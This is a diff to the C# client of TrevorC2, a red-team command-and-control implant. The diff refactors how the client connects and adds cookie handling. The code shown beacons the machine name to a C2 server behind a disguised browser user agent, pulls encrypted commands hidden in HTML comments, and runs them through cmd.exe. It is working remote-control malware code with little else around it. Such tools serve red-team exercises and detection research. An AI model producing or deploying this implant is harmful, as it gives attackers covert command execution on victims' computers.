@@ -6,18 +6,18 @@ namespace TrevorC2Client
     class TrevorC2Client
     {
         /*
-            TrevorC2 - legitimate looking command and control 
+            TrevorC2 - legitimate looking command and control
             Written by: Dave Kennedy @HackingDave
             Website: https://www.trustedsec.com
             GIT: https://github.com/trustedsec
             C# Client written by Franci Sacer (@francisacer1)
 
-            This is the client connection, and only an example. Refer to the readme 
+            This is the client connection, and only an example. Refer to the readme
             to build your own client connection to the server C2 infrastructure.
         */
 
         // CONFIG CONSTANTS:
-        
+
         const string SITE_URL = "http://127.0.0.1";
         const string ROOT_PATH_QUERY = "/";
         // THIS FLAG IS WHERE THE CLIENT WILL SUBMIT VIA URL AND QUERY STRING GET PARAMETER
@@ -32,10 +32,12 @@ namespace TrevorC2Client
         const int time_factor = 1000; // seconds
         // THIS IS OUR ENCRYPTION KEY - THIS NEEDS TO BE THE SAME ON BOTH SERVER AND CLIENT FOR APPROPRIATE DECRYPTION. RECOMMEND CHANGING THIS FROM THE DEFAULT KEY
         const string CIPHER = "Tr3v0rC2R0x@nd1s@w350m3#TrevorForget";
-        
+
         // DO NOT CHANGE BELOW THIS LINE
 
         static Random rng = new Random();
+        static System.Net.CookieContainer CookieContainer = new System.Net.CookieContainer();
+        static string computerName = Environment.MachineName;
 
         static System.Security.Cryptography.AesManaged CreateAesManagedObject(byte[] key = null, byte[] IV = null)
         {
@@ -92,22 +94,22 @@ namespace TrevorC2Client
             return rng.Next(time_interval1, time_interval2 + 1);
         }
 
-        static void Main(string[] args)
+        static void ConnectTrevor()
         {
-            var computerName = Environment.MachineName;
             while (true)
             {
                 var time = RandomInterval();
 
                 try
                 {
-                    var HOSTNAME = $"magic_hostname={computerName}";
+                    var HOSTNAME = String.Format("magic_hostname={0}",computerName);
                     var key = CreateAesKey();
                     var SEND = EncryptString(Convert.FromBase64String(key), HOSTNAME);
                     var s = System.Text.Encoding.UTF8.GetBytes(SEND);
                     SEND = Convert.ToBase64String(s);
-                    
+
                     var r = (System.Net.HttpWebRequest)System.Net.WebRequest.Create(SITE_URL + SITE_PATH_QUERY + "?" + QUERY_STRING + SEND);
+                    r.CookieContainer = CookieContainer;
                     r.Method = "GET";
                     r.KeepAlive = false;
                     r.UserAgent = "Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko";
@@ -117,12 +119,17 @@ namespace TrevorC2Client
                 }
                 catch (Exception)
                 {
-                    Console.WriteLine($"[*] Cannot connect to {SITE_URL}");
-                    Console.WriteLine($"[*] Trying again in {time} seconds...");
+                    Console.WriteLine(String.Format("[*] Cannot connect to {0}",SITE_URL));
+                    Console.WriteLine(String.Format("[*] Trying again in {0} seconds...",time));
                     System.Threading.Thread.Sleep(time * time_factor);
                     continue;
                 }
             }
+        }
+
+        static void Main(string[] args)
+        {
+            ConnectTrevor();
 
             while (true)
             {
@@ -131,6 +138,7 @@ namespace TrevorC2Client
                 try
                 {
                     var r = (System.Net.HttpWebRequest)System.Net.WebRequest.Create(SITE_URL + ROOT_PATH_QUERY);
+                    r.CookieContainer = CookieContainer;
                     r.Method = "GET";
                     r.KeepAlive = false;
                     r.UserAgent = "Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko";
@@ -139,8 +147,8 @@ namespace TrevorC2Client
                     var reqstream = resp.GetResponseStream();
                     var sr = new System.IO.StreamReader(reqstream);
                     string res = sr.ReadToEnd();
-                    var ENCRYPTEDSTREAM = res.Split('\n').Where(x => x.Contains($"<!-- {STUB}")).FirstOrDefault();
-                    var ENCRYPTED = ENCRYPTEDSTREAM.Split(new string[] { $"<!-- {STUB}" }, StringSplitOptions.None);
+                    var ENCRYPTEDSTREAM = res.Split('\n').Where(x => x.Contains(String.Format("<!-- {0}",STUB))).FirstOrDefault();
+                    var ENCRYPTED = ENCRYPTEDSTREAM.Split(new string[] { String.Format("<!-- {0}",STUB) }, StringSplitOptions.None);
                     ENCRYPTED = ENCRYPTED[1].Split(new string[] { " --></body>" }, StringSplitOptions.None);
                     var key = CreateAesKey();
                     var DECRYPTED = DecryptString(Convert.FromBase64String(key), ENCRYPTED[0]);
@@ -155,7 +163,7 @@ namespace TrevorC2Client
 
                             var compiler = new System.Diagnostics.Process();
                             compiler.StartInfo.FileName = "cmd.exe";
-                            compiler.StartInfo.Arguments = $"/Q /c {DECRYPTED} 2>&1";
+                            compiler.StartInfo.Arguments = String.Format("/Q /c {0} 2>&1",DECRYPTED);
                             compiler.StartInfo.UseShellExecute = false;
                             compiler.StartInfo.RedirectStandardOutput = true;
                             compiler.Start();
@@ -178,9 +186,10 @@ namespace TrevorC2Client
                 }
                 catch (Exception)
                 {
-                    Console.WriteLine($"[*] Cannot connect to {SITE_URL}");
-                    Console.WriteLine($"[*] Trying again in {time} seconds...");
+                    Console.WriteLine(String.Format("[*] Cannot connect to {0}",SITE_URL));
+                    Console.WriteLine(String.Format("[*] Trying again in {0} seconds...",time));
                     System.Threading.Thread.Sleep(time * time_factor);
+                    ConnectTrevor();
                     continue;
                 }
             }
